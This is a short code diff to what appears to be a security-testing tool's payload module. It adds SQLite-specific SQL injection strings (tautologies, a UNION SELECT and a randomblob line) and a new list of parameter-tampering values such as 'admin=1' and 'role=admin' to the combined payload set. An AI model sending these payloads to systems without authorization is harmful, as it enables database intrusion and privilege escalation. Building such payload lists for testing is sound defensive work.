@@ -36,6 +36,12 @@ export const SQL_INJECTION_PAYLOADS = [
   "'",
   "';",
   "\";",
+
+  // SQLite Specific
+  "' OR sqlite_version()=sqlite_version()--",
+  "' OR randomblob(1000)--",
+  "' UNION SELECT 1,sqlite_version(),3--",
+  "' OR 1=1 LIMIT 1 OFFSET 1--",
 ];
 
 /**
@@ -236,6 +242,17 @@ export const ATTACK_VECTOR_MAP: AttackVectorMetadata[] = [
 ];
 
 /**
+ * Logic Bypass / Configuration Manipulation
+ */
+export const LOGIC_BYPASS_PAYLOADS = [
+  "security_level=0",
+  "admin=1",
+  "debug=true",
+  "role=admin",
+  "test=1"
+];
+
+/**
  * Get all payloads
  */
 export const ALL_PAYLOADS = [
@@ -245,4 +262,5 @@ export const ALL_PAYLOADS = [
   ...PATH_TRAVERSAL_PAYLOADS,
   ...LDAP_INJECTION_PAYLOADS,
   ...NOSQL_INJECTION_PAYLOADS,
+  ...LOGIC_BYPASS_PAYLOADS,
 ];
